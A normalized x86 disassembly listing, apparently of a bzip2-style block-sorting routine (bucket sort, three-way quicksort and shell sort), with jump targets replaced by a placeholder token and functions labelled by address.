jmp r-xdata
mov ecx [ ebp - 0xd04 ]
add ecx 0x1
mov [ ebp - 0xd04 ] ecx
cmp [ ebp - 0xd04 ] 0xff
jg r-xdata
cmp [ ebp - 0xd24 ] 0x1
jne r-xdata
mov ecx [ ebp - 0xd04 ]
mov edx [ ebp + ecx * 4 - 0x500 ]
mov [ ebp - 0xd28 ] edx
mov eax [ ebp - 0xd04 ]
mov [ ebp - 0xd20 ] eax
mov [ ebp - 0xd0c ] 0x0
mov [ ebp - 0xd04 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xd20 ]
mov ecx [ ebp - 0xd28 ]
mov [ ebp + eax * 4 - 0x500 ] ecx
jmp r-xdata
mov ecx [ ebp - 0xd20 ]
sub ecx [ ebp - 0xd24 ]
mov edx [ ebp - 0xd20 ]
mov eax [ ebp + ecx * 4 - 0x500 ]
mov [ ebp + edx * 4 - 0x500 ] eax
mov ecx [ ebp - 0xd20 ]
sub ecx [ ebp - 0xd24 ]
mov [ ebp - 0xd20 ] ecx
mov edx [ ebp - 0xd24 ]
sub edx 0x1
cmp [ ebp - 0xd20 ] edx
jg r-xdata
cmp [ ebp - 0xd04 ] 0xff
jg r-xdata
mov eax [ ebp - 0xd04 ]
add eax 0x1
mov [ ebp - 0xd04 ] eax
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x1c ] 0x4
jl r-xdata
mov eax [ ebp - 0xd04 ]
mov ecx [ ebp + eax * 4 - 0x500 ]
mov [ ebp - 0xd1c ] ecx
mov [ ebp - 0xd20 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0xd20 ]
sub ecx [ ebp - 0xd24 ]
mov edx [ ebp + ecx * 4 - 0x500 ]
add edx 0x1
shl edx 0x8
mov eax [ ebp - 0xd20 ]
sub eax [ ebp - 0xd24 ]
mov ecx [ ebp + eax * 4 - 0x500 ]
shl ecx 0x8
mov eax [ ebp + 0x14 ]
mov esi [ ebp + 0x14 ]
mov edx [ eax + edx * 4 ]
sub edx [ esi + ecx * 4 ]
mov eax [ ebp - 0xd28 ]
add eax 0x1
shl eax 0x8
mov ecx [ ebp - 0xd28 ]
shl ecx 0x8
mov esi [ ebp + 0x14 ]
mov edi [ ebp + 0x14 ]
mov eax [ esi + eax * 4 ]
sub eax [ edi + ecx * 4 ]
cmp edx eax
jbe r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
xor eax eax
jne r-xdata
cmp [ ebp - 0xd20 ] 0xff
jg r-xdata
mov edx [ ebp - 0xd1c ]
movzx eax [ ebp + edx - 0x100 ]
test eax eax
je r-xdata
mov eax [ ebp - 0xd20 ]
cmp eax [ ebp - 0xd1c ]
je r-xdata
mov [ ebp - 0xd20 ] 0x0
jmp r-xdata
push 0x3ee
call sub_4057d5
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0xd1c ]
shl ecx 0x8
add ecx [ ebp - 0xd20 ]
mov [ ebp - 0xd10 ] ecx
mov edx [ ebp - 0xd10 ]
mov eax [ ebp + 0x14 ]
mov ecx [ eax + edx * 4 ]
and ecx 0x200000
jne r-xdata
cmp [ ebp - 0xd20 ] 0xff
jg r-xdata
mov edx [ ebp - 0xd20 ]
add edx 0x1
mov [ ebp - 0xd20 ] edx
mov eax [ ebp - 0xd10 ]
mov ecx [ ebp + 0x14 ]
mov edx [ ecx + eax * 4 ]
or edx 0x200000
mov eax [ ebp - 0xd10 ]
mov ecx [ ebp + 0x14 ]
mov [ ecx + eax * 4 ] edx
mov edx [ ebp - 0xd10 ]
mov eax [ ebp + 0x14 ]
mov ecx [ eax + edx * 4 ]
and ecx 0xffdfffff
mov [ ebp - 0xd2c ] ecx
mov edx [ ebp - 0xd10 ]
mov eax [ ebp + 0x14 ]
mov ecx [ eax + edx * 4 + 0x4 ]
and ecx 0xffdfffff
sub ecx 0x1
mov [ ebp - 0xd30 ] ecx
mov edx [ ebp - 0xd30 ]
cmp edx [ ebp - 0xd2c ]
jle r-xdata
mov ecx [ ebp - 0xd1c ]
shl ecx 0x8
mov edx [ ebp + 0x14 ]
mov eax [ edx + ecx * 4 ]
and eax 0xffdfffff
mov [ ebp - 0xd20 ] eax
jmp r-xdata
mov edx [ ebp - 0xd20 ]
shl edx 0x8
add edx [ ebp - 0xd1c ]
mov eax [ ebp + 0x14 ]
mov ecx [ eax + edx * 4 ]
and ecx 0xffdfffff
mov edx [ ebp - 0xd20 ]
mov [ ebp + edx * 4 - 0xd00 ] ecx
mov eax [ ebp - 0xd20 ]
shl eax 0x8
add eax [ ebp - 0xd1c ]
mov ecx [ ebp + 0x14 ]
mov edx [ ecx + eax * 4 + 0x4 ]
and edx 0xffdfffff
sub edx 0x1
mov eax [ ebp - 0xd20 ]
mov [ ebp + eax * 4 - 0x900 ] edx
jmp r-xdata
cmp [ ebp + 0x1c ] 0x4
jl r-xdata
mov edx [ ebp - 0xd1c ]
mov eax [ ebp - 0xd20 ]
cmp eax [ ebp + edx * 4 - 0xd00 ]
jge r-xdata
mov ecx [ ebp - 0xd20 ]
add ecx 0x1
mov [ ebp - 0xd20 ] ecx
mov ecx [ ebp + 0x20 ]
push ecx
push 0x2
mov edx [ ebp - 0xd30 ]
push edx
mov eax [ ebp - 0xd2c ]
push eax
mov ecx [ ebp + 0x18 ]
push ecx
mov edx [ ebp + 0x10 ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_412580
add esp 0x20
mov edx [ ebp - 0xd30 ]
sub edx [ ebp - 0xd2c ]
mov eax [ ebp - 0xd0c ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0xd0c ] ecx
mov edx [ ebp + 0x20 ]
cmp [ edx ] 0x0
jge r-xdata
xor eax eax
jne r-xdata
mov ecx [ ebp - 0xd1c ]
add ecx 0x1
shl ecx 0x8
mov edx [ ebp + 0x14 ]
mov eax [ edx + ecx * 4 ]
and eax 0xffdfffff
sub eax 0x1
mov [ ebp - 0xd20 ] eax
jmp r-xdata
mov ecx [ ebp - 0xd20 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + ecx * 4 ]
sub eax 0x1
mov [ ebp - 0xd18 ] eax
jns r-xdata
jmp r-xdata
mov edx [ ebp - 0xd1c ]
mov eax [ ebp - 0xd20 ]
cmp eax [ ebp + edx * 4 - 0x900 ]
jle r-xdata
mov edx [ ebp + 0xc ]
add edx [ ebp - 0xd18 ]
mov al [ edx ]
mov [ ebp - 0xd11 ] al
movzx ecx [ ebp - 0xd11 ]
movzx edx [ ebp + ecx - 0x100 ]
test edx edx
jne r-xdata
mov ecx [ ebp - 0xd18 ]
add ecx [ ebp + 0x18 ]
mov [ ebp - 0xd18 ] ecx
mov ecx [ ebp - 0xd1c ]
mov edx [ ebp + ecx * 4 - 0xd00 ]
sub edx 0x1
mov eax [ ebp - 0xd1c ]
cmp edx [ ebp + eax * 4 - 0x900 ]
je r-xdata
mov ecx [ ebp - 0xd20 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + ecx * 4 ]
sub eax 0x1
mov [ ebp - 0xd18 ] eax
jns r-xdata
jmp r-xdata
movzx eax [ ebp - 0xd11 ]
mov ecx [ ebp + eax * 4 - 0xd00 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0xd18 ]
mov [ edx + ecx * 4 ] eax
movzx ecx [ ebp - 0xd11 ]
mov edx [ ebp + ecx * 4 - 0xd00 ]
add edx 0x1
movzx eax [ ebp - 0xd11 ]
mov [ ebp + eax * 4 - 0xd00 ] edx
mov [ ebp - 0xd20 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0xd1c ]
cmp [ ebp + ecx * 4 - 0xd00 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
add edx [ ebp - 0xd18 ]
mov al [ edx ]
mov [ ebp - 0xd11 ] al
movzx ecx [ ebp - 0xd11 ]
movzx edx [ ebp + ecx - 0x100 ]
test edx edx
jne r-xdata
mov ecx [ ebp - 0xd18 ]
add ecx [ ebp + 0x18 ]
mov [ ebp - 0xd18 ] ecx
mov ecx [ ebp - 0xd20 ]
add ecx 0x1
mov [ ebp - 0xd20 ] ecx
cmp [ ebp - 0xd20 ] 0xff
jg r-xdata
push 0x3ef
call sub_4057d5
add esp 0x4
mov edx [ ebp + 0x18 ]
sub edx 0x1
mov eax [ ebp - 0xd1c ]
cmp [ ebp + eax * 4 - 0x900 ] edx
je r-xdata
jmp r-xdata
movzx eax [ ebp - 0xd11 ]
mov ecx [ ebp + eax * 4 - 0x900 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0xd18 ]
mov [ edx + ecx * 4 ] eax
movzx ecx [ ebp - 0xd11 ]
mov edx [ ebp + ecx * 4 - 0x900 ]
sub edx 0x1
movzx eax [ ebp - 0xd11 ]
mov [ ebp + eax * 4 - 0x900 ] edx
mov ecx [ ebp - 0xd1c ]
mov [ ebp + ecx - 0x100 ] 0x1
cmp [ ebp - 0xd04 ] 0xff
jge r-xdata
mov edx [ ebp - 0xd20 ]
shl edx 0x8
add edx [ ebp - 0xd1c ]
mov eax [ ebp + 0x14 ]
mov ecx [ eax + edx * 4 ]
or ecx 0x200000
mov edx [ ebp - 0xd20 ]
shl edx 0x8
add edx [ ebp - 0xd1c ]
mov eax [ ebp + 0x14 ]
mov [ eax + edx * 4 ] ecx
jmp r-xdata
mov ecx [ ebp - 0xd20 ]
sub ecx 0x1
mov [ ebp - 0xd20 ] ecx
jmp r-xdata
mov edx [ ebp - 0xd1c ]
shl edx 0x8
mov eax [ ebp + 0x14 ]
mov ecx [ eax + edx * 4 ]
and ecx 0xffdfffff
mov [ ebp - 0xd38 ] ecx
mov edx [ ebp - 0xd1c ]
add edx 0x1
shl edx 0x8
mov eax [ ebp + 0x14 ]
mov ecx [ eax + edx * 4 ]
and ecx 0xffdfffff
sub ecx [ ebp - 0xd38 ]
mov [ ebp - 0xd3c ] ecx
mov [ ebp - 0xd34 ] 0x0
mov ecx [ ebp - 0xd20 ]
add ecx 0x1
mov [ ebp - 0xd20 ] ecx
mov edx [ ebp - 0xd04 ]
add edx 0x1
mov [ ebp - 0xd04 ] edx
mov ecx [ ebp - 0xd3c ]
sub ecx 0x1
mov [ ebp - 0xd20 ] ecx
jmp r-xdata
mov eax [ ebp - 0xd34 ]
add eax 0x1
mov [ ebp - 0xd34 ] eax
jmp r-xdata
cmp [ ebp - 0xd20 ] 0x0
jl r-xdata
mov edx [ ebp - 0xd3c ]
mov ecx [ ebp - 0xd34 ]
sar edx cl
cmp edx 0xfffe
jle r-xdata
mov edx [ ebp - 0xd3c ]
sub edx 0x1
mov ecx [ ebp - 0xd34 ]
sar edx cl
cmp edx 0xffff
jle r-xdata
mov eax [ ebp - 0xd38 ]
add eax [ ebp - 0xd20 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 ]
mov [ ebp - 0xd44 ] edx
mov eax [ ebp - 0xd20 ]
mov ecx [ ebp - 0xd34 ]
sar eax cl
mov [ ebp - 0xd40 ] ax
mov ecx [ ebp - 0xd44 ]
mov edx [ ebp + 0x10 ]
mov ax [ ebp - 0xd40 ]
mov [ edx + ecx * 2 ] ax
cmp [ ebp - 0xd44 ] 0x22
jge r-xdata
push 0x3ea
call sub_4057d5
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0xd44 ]
add ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x10 ]
mov ax [ ebp - 0xd40 ]
mov [ edx + ecx * 2 ] ax
mov edx [ ebp - 0xd20 ]
sub edx 0x1
mov [ ebp - 0xd20 ] edx
sub_412580
push ebp
mov ebp esp
sub esp 0x548
push esi
mov [ ebp - 0x33c ] 0x0
mov eax [ ebp - 0x33c ]
mov ecx [ ebp + 0x18 ]
mov [ ebp + eax * 4 - 0x338 ] ecx
mov edx [ ebp - 0x33c ]
mov eax [ ebp + 0x1c ]
mov [ ebp + edx * 4 - 0x4e0 ] eax
mov ecx [ ebp - 0x33c ]
mov edx [ ebp + 0x20 ]
mov [ ebp + ecx * 4 - 0x198 ] edx
mov eax [ ebp - 0x33c ]
add eax 0x1
mov [ ebp - 0x33c ] eax
pop esi
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x33c ] 0x62
jl r-xdata
mov ecx [ ebp - 0x33c ]
sub ecx 0x1
mov [ ebp - 0x33c ] ecx
mov edx [ ebp - 0x33c ]
mov eax [ ebp + edx * 4 - 0x338 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x33c ]
mov edx [ ebp + ecx * 4 - 0x4e0 ]
mov [ ebp - 0x4f8 ] edx
mov eax [ ebp - 0x33c ]
mov ecx [ ebp + eax * 4 - 0x198 ]
mov [ ebp - 0x504 ] ecx
mov edx [ ebp - 0x4f8 ]
sub edx [ ebp - 0x4 ]
cmp edx 0x14
jl r-xdata
push 0x3e9
call sub_4057d5
add esp 0x4
mov eax [ ebp + 0x24 ]
push eax
mov ecx [ ebp - 0x504 ]
push ecx
mov edx [ ebp - 0x4f8 ]
push edx
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0x14 ]
push ecx
mov edx [ ebp + 0x10 ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_412e80
add esp 0x20
mov edx [ ebp + 0x24 ]
cmp [ edx ] 0x0
jge r-xdata
cmp [ ebp - 0x504 ] 0xe
jle r-xdata
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x4f8 ]
sar eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 ]
add edx [ ebp - 0x504 ]
mov eax [ ebp + 0xc ]
mov cl [ eax + edx ]
push ecx
mov edx [ ebp - 0x4f8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 ]
add ecx [ ebp - 0x504 ]
mov edx [ ebp + 0xc ]
mov al [ edx + ecx ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + ecx * 4 ]
add eax [ ebp - 0x504 ]
mov ecx [ ebp + 0xc ]
mov dl [ ecx + eax ]
push edx
call sub_4138f0
add esp 0xc
movzx eax al
mov [ ebp - 0x4f4 ] eax
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x4fc ] ecx
mov edx [ ebp - 0x4fc ]
mov [ ebp - 0x4e4 ] edx
mov eax [ ebp - 0x4f8 ]
mov [ ebp - 0x350 ] eax
mov ecx [ ebp - 0x350 ]
mov [ ebp - 0x500 ] ecx
cmp [ ebp - 0x33c ] 0x0
jle r-xdata
xor edx edx
jne r-xdata
mov eax 0x1
test eax eax
je r-xdata
mov eax [ ebp - 0x350 ]
cmp eax [ ebp - 0x4fc ]
jge r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x4e4 ]
cmp ecx [ ebp - 0x500 ]
jle r-xdata
mov edx [ ebp - 0x4fc ]
sub edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4e4 ]
sub eax [ ebp - 0x4fc ]
cmp edx eax
jge r-xdata
mov ecx [ ebp - 0x33c ]
mov edx [ ebp - 0x4 ]
mov [ ebp + ecx * 4 - 0x338 ] edx
mov eax [ ebp - 0x33c ]
mov ecx [ ebp - 0x4f8 ]
mov [ ebp + eax * 4 - 0x4e0 ] ecx
mov edx [ ebp - 0x504 ]
add edx 0x1
mov eax [ ebp - 0x33c ]
mov [ ebp + eax * 4 - 0x198 ] edx
mov ecx [ ebp - 0x33c ]
add ecx 0x1
mov [ ebp - 0x33c ] ecx
jmp r-xdata
mov edx [ ebp - 0x4e4 ]
cmp edx [ ebp - 0x500 ]
jle r-xdata
mov edx [ ebp - 0x4e4 ]
cmp edx [ ebp - 0x500 ]
jle r-xdata
mov edx [ ebp - 0x4e4 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 ]
add ecx [ ebp - 0x504 ]
mov edx [ ebp + 0xc ]
movzx eax [ edx + ecx ]
sub eax [ ebp - 0x4f4 ]
mov [ ebp - 0x340 ] eax
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x4e4 ]
sub edx [ ebp - 0x4fc ]
mov [ ebp - 0x544 ] edx
mov ecx [ ebp - 0x4fc ]
sub ecx [ ebp - 0x4 ]
mov [ ebp - 0x544 ] ecx
jmp r-xdata
mov eax [ ebp - 0x4e4 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 ]
mov [ ebp - 0x514 ] edx
mov eax [ ebp - 0x4e4 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x500 ]
mov esi [ ebp + 0x8 ]
mov edx [ esi + edx * 4 ]
mov [ ecx + eax * 4 ] edx
mov eax [ ebp - 0x500 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x514 ]
mov [ ecx + eax * 4 ] edx
mov eax [ ebp - 0x4e4 ]
add eax 0x1
mov [ ebp - 0x4e4 ] eax
mov ecx [ ebp - 0x500 ]
sub ecx 0x1
mov [ ebp - 0x500 ] ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x500 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 ]
add edx [ ebp - 0x504 ]
mov eax [ ebp + 0xc ]
movzx ecx [ eax + edx ]
sub ecx [ ebp - 0x4f4 ]
mov [ ebp - 0x340 ] ecx
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x340 ] 0x0
jle r-xdata
mov ecx [ ebp - 0x4e4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + ecx * 4 ]
mov [ ebp - 0x50c ] eax
mov ecx [ ebp - 0x4e4 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4fc ]
mov esi [ ebp + 0x8 ]
mov eax [ esi + eax * 4 ]
mov [ edx + ecx * 4 ] eax
mov ecx [ ebp - 0x4fc ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x50c ]
mov [ edx + ecx * 4 ] eax
mov ecx [ ebp - 0x4fc ]
add ecx 0x1
mov [ ebp - 0x4fc ] ecx
mov edx [ ebp - 0x4e4 ]
add edx 0x1
mov [ ebp - 0x4e4 ] edx
jmp r-xdata
mov ecx [ ebp - 0x4f8 ]
sub ecx [ ebp - 0x350 ]
mov edx [ ebp - 0x350 ]
sub edx [ ebp - 0x500 ]
cmp ecx edx
jge r-xdata
mov ecx [ ebp - 0x51c ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + ecx * 4 ]
mov [ ebp - 0x524 ] eax
mov ecx [ ebp - 0x51c ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x518 ]
mov esi [ ebp + 0x8 ]
mov eax [ esi + eax * 4 ]
mov [ edx + ecx * 4 ] eax
mov ecx [ ebp - 0x518 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x524 ]
mov [ edx + ecx * 4 ] eax
mov ecx [ ebp - 0x51c ]
add ecx 0x1
mov [ ebp - 0x51c ] ecx
mov edx [ ebp - 0x518 ]
add edx 0x1
mov [ ebp - 0x518 ] edx
mov eax [ ebp - 0x520 ]
sub eax 0x1
mov [ ebp - 0x520 ] eax
jmp r-xdata
mov eax [ ebp - 0x544 ]
mov [ ebp - 0x340 ] eax
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x51c ] ecx
mov edx [ ebp - 0x4e4 ]
sub edx [ ebp - 0x340 ]
mov [ ebp - 0x518 ] edx
mov eax [ ebp - 0x340 ]
mov [ ebp - 0x520 ] eax
mov edx 0x1
test edx edx
je r-xdata
cmp [ ebp - 0x340 ] 0x0
jge r-xdata
mov edx [ ebp - 0x500 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 ]
mov [ ebp - 0x510 ] ecx
mov edx [ ebp - 0x500 ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x350 ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + ecx * 4 ]
mov [ eax + edx * 4 ] ecx
mov edx [ ebp - 0x350 ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x510 ]
mov [ eax + edx * 4 ] ecx
mov edx [ ebp - 0x350 ]
sub edx 0x1
mov [ ebp - 0x350 ] edx
mov eax [ ebp - 0x500 ]
sub eax 0x1
mov [ ebp - 0x500 ] eax
jmp r-xdata
mov eax [ ebp - 0x4e4 ]
add eax 0x1
mov [ ebp - 0x4e4 ] eax
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x350 ]
sub ecx [ ebp - 0x500 ]
mov [ ebp - 0x548 ] ecx
mov eax [ ebp - 0x4f8 ]
sub eax [ ebp - 0x350 ]
mov [ ebp - 0x548 ] eax
jmp r-xdata
cmp [ ebp - 0x520 ] 0x0
jle r-xdata
mov ecx [ ebp - 0x500 ]
sub ecx 0x1
mov [ ebp - 0x500 ] ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x4e4 ]
sub eax [ ebp - 0x4fc ]
sub eax 0x1
mov [ ebp - 0x340 ] eax
mov ecx [ ebp - 0x350 ]
sub ecx [ ebp - 0x500 ]
mov edx [ ebp - 0x4f8 ]
sub edx ecx
add edx 0x1
mov [ ebp - 0x508 ] edx
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4f0 ] eax
mov ecx [ ebp - 0x340 ]
mov [ ebp - 0x1a4 ] ecx
mov edx [ ebp - 0x504 ]
mov [ ebp - 0x34c ] edx
mov eax [ ebp - 0x508 ]
mov [ ebp - 0x4ec ] eax
mov ecx [ ebp - 0x4f8 ]
mov [ ebp - 0x1a0 ] ecx
mov edx [ ebp - 0x504 ]
mov [ ebp - 0x348 ] edx
mov eax [ ebp - 0x340 ]
add eax 0x1
mov [ ebp - 0x4e8 ] eax
mov ecx [ ebp - 0x508 ]
sub ecx 0x1
mov [ ebp - 0x19c ] ecx
mov edx [ ebp - 0x504 ]
add edx 0x1
mov [ ebp - 0x344 ] edx
mov eax [ ebp - 0x1a4 ]
sub eax [ ebp - 0x4f0 ]
mov ecx [ ebp - 0x1a0 ]
sub ecx [ ebp - 0x4ec ]
cmp eax ecx
jge r-xdata
mov eax [ ebp - 0x52c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 ]
mov [ ebp - 0x534 ] edx
mov eax [ ebp - 0x52c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x528 ]
mov esi [ ebp + 0x8 ]
mov edx [ esi + edx * 4 ]
mov [ ecx + eax * 4 ] edx
mov eax [ ebp - 0x528 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x534 ]
mov [ ecx + eax * 4 ] edx
mov eax [ ebp - 0x52c ]
add eax 0x1
mov [ ebp - 0x52c ] eax
mov ecx [ ebp - 0x528 ]
add ecx 0x1
mov [ ebp - 0x528 ] ecx
mov edx [ ebp - 0x530 ]
sub edx 0x1
mov [ ebp - 0x530 ] edx
jmp r-xdata
mov edx [ ebp - 0x548 ]
mov [ ebp - 0x508 ] edx
mov eax [ ebp - 0x4e4 ]
mov [ ebp - 0x52c ] eax
mov ecx [ ebp - 0x4f8 ]
sub ecx [ ebp - 0x508 ]
add ecx 0x1
mov [ ebp - 0x528 ] ecx
mov edx [ ebp - 0x508 ]
mov [ ebp - 0x530 ] edx
mov edx [ ebp - 0x1a0 ]
sub edx [ ebp - 0x4ec ]
mov eax [ ebp - 0x19c ]
sub eax [ ebp - 0x4e8 ]
cmp edx eax
jge r-xdata
mov edx [ ebp - 0x4f0 ]
mov [ ebp - 0x538 ] edx
mov eax [ ebp - 0x4ec ]
mov [ ebp - 0x4f0 ] eax
mov ecx [ ebp - 0x538 ]
mov [ ebp - 0x4ec ] ecx
mov edx [ ebp - 0x1a4 ]
mov [ ebp - 0x538 ] edx
mov eax [ ebp - 0x1a0 ]
mov [ ebp - 0x1a4 ] eax
mov ecx [ ebp - 0x538 ]
mov [ ebp - 0x1a0 ] ecx
mov edx [ ebp - 0x34c ]
mov [ ebp - 0x538 ] edx
mov eax [ ebp - 0x348 ]
mov [ ebp - 0x34c ] eax
mov ecx [ ebp - 0x538 ]
mov [ ebp - 0x348 ] ecx
cmp [ ebp - 0x530 ] 0x0
jle r-xdata
mov ecx [ ebp - 0x1a4 ]
sub ecx [ ebp - 0x4f0 ]
mov edx [ ebp - 0x1a0 ]
sub edx [ ebp - 0x4ec ]
cmp ecx edx
jge r-xdata
mov ecx [ ebp - 0x4ec ]
mov [ ebp - 0x53c ] ecx
mov edx [ ebp - 0x4e8 ]
mov [ ebp - 0x4ec ] edx
mov eax [ ebp - 0x53c ]
mov [ ebp - 0x4e8 ] eax
mov ecx [ ebp - 0x1a0 ]
mov [ ebp - 0x53c ] ecx
mov edx [ ebp - 0x19c ]
mov [ ebp - 0x1a0 ] edx
mov eax [ ebp - 0x53c ]
mov [ ebp - 0x19c ] eax
mov ecx [ ebp - 0x348 ]
mov [ ebp - 0x53c ] ecx
mov edx [ ebp - 0x344 ]
mov [ ebp - 0x348 ] edx
mov eax [ ebp - 0x53c ]
mov [ ebp - 0x344 ] eax
xor eax eax
jne r-xdata
mov eax [ ebp - 0x4f0 ]
mov [ ebp - 0x540 ] eax
mov ecx [ ebp - 0x4ec ]
mov [ ebp - 0x4f0 ] ecx
mov edx [ ebp - 0x540 ]
mov [ ebp - 0x4ec ] edx
mov eax [ ebp - 0x1a4 ]
mov [ ebp - 0x540 ] eax
mov ecx [ ebp - 0x1a0 ]
mov [ ebp - 0x1a4 ] ecx
mov edx [ ebp - 0x540 ]
mov [ ebp - 0x1a0 ] edx
mov eax [ ebp - 0x34c ]
mov [ ebp - 0x540 ] eax
mov ecx [ ebp - 0x348 ]
mov [ ebp - 0x34c ] ecx
mov edx [ ebp - 0x540 ]
mov [ ebp - 0x348 ] edx
xor ecx ecx
jne r-xdata
mov edx [ ebp - 0x33c ]
mov eax [ ebp - 0x4f0 ]
mov [ ebp + edx * 4 - 0x338 ] eax
mov ecx [ ebp - 0x33c ]
mov edx [ ebp - 0x1a4 ]
mov [ ebp + ecx * 4 - 0x4e0 ] edx
mov eax [ ebp - 0x33c ]
mov ecx [ ebp - 0x34c ]
mov [ ebp + eax * 4 - 0x198 ] ecx
mov edx [ ebp - 0x33c ]
add edx 0x1
mov [ ebp - 0x33c ] edx
mov eax [ ebp - 0x33c ]
mov ecx [ ebp - 0x4ec ]
mov [ ebp + eax * 4 - 0x338 ] ecx
mov edx [ ebp - 0x33c ]
mov eax [ ebp - 0x1a0 ]
mov [ ebp + edx * 4 - 0x4e0 ] eax
mov ecx [ ebp - 0x33c ]
mov edx [ ebp - 0x348 ]
mov [ ebp + ecx * 4 - 0x198 ] edx
mov eax [ ebp - 0x33c ]
add eax 0x1
mov [ ebp - 0x33c ] eax
mov ecx [ ebp - 0x33c ]
mov edx [ ebp - 0x4e8 ]
mov [ ebp + ecx * 4 - 0x338 ] edx
mov eax [ ebp - 0x33c ]
mov ecx [ ebp - 0x19c ]
mov [ ebp + eax * 4 - 0x4e0 ] ecx
mov edx [ ebp - 0x33c ]
mov eax [ ebp - 0x344 ]
mov [ ebp + edx * 4 - 0x198 ] eax
mov ecx [ ebp - 0x33c ]
add ecx 0x1
mov [ ebp - 0x33c ] ecx
jmp r-xdata
sub_412e80
push ebp
mov ebp esp
sub esp 0x18
push esi
mov eax [ ebp + 0x1c ]
sub eax [ ebp + 0x18 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x2
jge r-xdata
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x14 ]
sub ecx 0x1
mov [ ebp - 0x14 ] ecx
jmp r-xdata
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ecx * 4 + rw-data ]
cmp edx [ ebp - 0x8 ]
jge r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ eax * 4 + rw-data ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x18 ]
add edx [ ebp - 0xc ]
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
cmp ecx [ ebp + 0x1c ]
jle r-xdata
mov edx [ ebp - 0x14 ]
sub edx 0x1
mov [ ebp - 0x14 ] edx
mov edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x10 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + edx * 4 ] ecx
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x10 ]
cmp eax [ ebp + 0x1c ]
jle r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0xc ]
mov ecx [ ebp - 0x18 ]
mov edx [ ebp + 0x8 ]
mov esi [ ebp + 0x8 ]
mov eax [ esi + eax * 4 ]
mov [ edx + ecx * 4 ] eax
mov ecx [ ebp - 0x18 ]
sub ecx [ ebp - 0xc ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp + 0x18 ]
lea ecx [ eax + edx - 0x1 ]
cmp [ ebp - 0x18 ] ecx
jg r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + ecx * 4 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
